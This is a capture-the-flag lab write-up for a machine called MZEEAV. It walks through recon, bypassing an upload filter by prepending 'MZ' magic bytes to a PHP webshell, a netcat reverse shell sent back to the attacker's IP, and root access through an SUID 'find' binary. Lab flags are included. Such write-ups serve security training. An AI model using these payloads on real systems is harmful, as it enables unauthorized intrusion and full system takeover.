# CTF Writeup: MZEEAV

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.33
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 11:40 EST
Warning: 192.168.130.33 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.130.33
Host is up (0.031s latency).
Not shown: 65154 closed tcp ports (reset), 379 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
|_http-server-header: Apache/2.4.56 (Debian)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   30.17 ms 192.168.45.1
2   30.27 ms 192.168.45.254
3   31.94 ms 192.168.251.1
4   32.09 ms 192.168.130.33

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.32 seconds
```

Since there is only an webpage running, let's map an domain called mzeeav.pg to our target ip in our local dns file /etc/hosts.

```
sudo echo "192.168.130.33 mzeeav.pg" | sudo tee -a /etc/hosts
```

The webpage seems to be offering an upload functionality.

I'm assuming we will need to bypass the filters.

Let's start by checking if there is an /upload endpoint.

Enumerated endpoints.

```
gobuster dir -u http://mzeeav.pg/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mzeeav.pg/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 301) [Size: 307] [--> http://mzeeav.pg/upload/]
/backups              (Status: 301) [Size: 308] [--> http://mzeeav.pg/backups/]
Progress: 30279 / 220559 (13.73%)^C
```

The /upload directory seems to be of no use.

there is an backups.zip file stored in the /backups endpoint, downloaded it locally.

We retrieved the webroot and some interesting files.

Let's analyze them.

It provides us with information about the filters in /var/www/html/upload.php, that the uploaded file get's checked with magicbytes. if it's an MZ file (only the first 2 letters).
 
```
/* Check MagicBytes MZ PEFILE 4D5A*/
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));

/* if its not a PEFILE block it - str_contains onlz php 8*/
//if ( ! (str_contains($magicbytes, '4D5A'))) {
if ( strpos($magicbytes, '4D5A') === false ) {
        echo "Error no valid PEFILE\n";
        error_log(print_r("No valid PEFILE", TRUE));
        error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
        exit ();
```

Let's utilize the following .php script in order to gain an webshell.

```
cat shell.php 
<?php system($_GET['cmd']); ?>
```

Select it via the upload functionality, but before uploading send it to burp proxy.

Utilize Burp Repeater to manipulate the request and bypass filters. Since Magicbytes checks the first 2 letters, we will only have to add "MZ" at the beginning.

```
------geckoformboundaryc0fbef7e4f7d588b5a173bb8a569e8db
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

MZ
<?php system($_GET['cmd']); ?>
```

After sending the request, we got an 200 server response, which means our webshell got uploaded onto the target webroot. Let's try and view if it works.

```
curl http://mzeeav.pg/upload/shell.php?cmd=whoami                                                                                        
MZ
www-data
```

It's working, let's check if netcat is installed on the target server.

Netcat is installed. In order to get RCE we can use it.

```
curl http://mzeeav.pg/upload/shell.php?cmd=which+nc 
MZ
/usr/bin/nc
```

Start up listener on port 80.

```
nc -lvnp 80
```

Send the following request.

```
curl http://mzeeav.pg/upload/shell.php?cmd=nc+192.168.45.164+80+-e+/bin/bash
```

Gained RCE as user "www-data".


Retrieved local.txt in /home/avuser directory.

```
984fe8ec75663153663f3914e49598e3
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated Binaries with an SUID set.

```
www-data@mzeeav:/home/avuser$ find / -perm /4000 2>/dev/null
/opt/fileS
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
```

One seems rather interesting /opt/fileS

This binary seems to be special.

After enumerating what it can do, we tried the -exec spec but it didnt work.

```
/opt/fileS --help
```
```
www-data@mzeeav:/opt$ /opt/fileS -exec id
/opt/fileS: missing argument to `-exec'
```

Let's check for --version spec to see what kind of binary it is.

```
www-data@mzeeav:/opt$ /opt/fileS --version
find (GNU findutils) 4.8.0
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Eric B. Decker, James Youngman, and Kevin Dalley.
Features enabled: D_TYPE O_NOFOLLOW(enabled) LEAF_OPTIMISATION FTS(FTS_CWDFD) CBO(level=2)
```

It seems to be an /find binary. Let's utilize the PoC for gtfobins.github.io

Gained RCE as user "root".

```
www-data@mzeeav:/opt$ /opt/fileS . -exec /bin/sh -p \; -quit
# whoami
root
```

Retrieved proof.txt in /root directory.

```
d84afd4c6202930eeca20ef3e5ff282d
```
